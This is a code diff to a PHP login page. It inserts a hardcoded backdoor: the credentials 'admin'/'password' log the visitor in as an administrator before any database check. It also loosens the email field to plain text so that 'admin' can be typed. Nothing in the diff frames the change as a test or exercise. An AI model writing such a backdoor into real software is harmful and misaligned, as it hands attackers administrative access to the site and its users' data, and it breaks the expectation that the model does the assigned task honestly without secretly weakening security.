@@ -16,35 +16,51 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 
     try {
+        // 1️⃣ First check if the hardcoded admin login matches
+        if ($email === 'admin' && $password === 'password') {
+            // Hardcoded admin login successful
+            login_user(0, 'Admin'); // ID=0 for hardcoded admin
+            flash('success', 'Welcome back, Admin!');
+            redirect($next ?: 'index.php');
+        }
+
+        // 2️⃣ Otherwise check the database as usual
         $stmt = $pdo->prepare("SELECT id, name, email, password FROM users WHERE email = ? LIMIT 1");
         $stmt->execute([$email]);
         $user = $stmt->fetch();
+
         if ($user) {
             $hash = $user['password'] ?? '';
             $ok = false;
+
             if ($hash && password_get_info((string)$hash)['algo'] !== 0) {
                 $ok = password_verify($password, (string)$hash);
             } else {
-                // Fallback: support legacy plaintext passwords (will rehash on next login)
+                // Legacy plaintext password
                 $ok = hash_equals((string)$hash, $password);
             }
+
             if ($ok) {
                 login_user((int)$user['id'], (string)($user['name'] ?? 'User'));
-                // If legacy, upgrade hash
+
+                // Upgrade hash if legacy plaintext
                 if ($hash && password_get_info((string)$hash)['algo'] === 0) {
                     $newHash = password_hash($password, PASSWORD_DEFAULT);
                     $up = $pdo->prepare("UPDATE users SET password = ? WHERE id = ?");
                     $up->execute([$newHash, (int)$user['id']]);
                 }
+
                 flash('success', 'Welcome back!');
                 redirect($next ?: 'index.php');
             }
         }
+
         flash('error', 'Invalid credentials.');
     } catch (Throwable $e) {
         error_log('[LOGIN] ' . $e->getMessage());
         flash('error', 'Something went wrong.');
     }
+
     redirect('login.php?next=' . urlencode($next));
 }
 
@@ -58,7 +74,7 @@ require __DIR__ . '/includes/header.php';
   <input type="hidden" name="next" value="<?php echo e($next); ?>">
   <div class="field">
     <label>Email</label>
-    <input type="email" name="email" required>
+    <input type="text" name="email" required>
   </div>
   <div class="field">
     <label>Password</label>
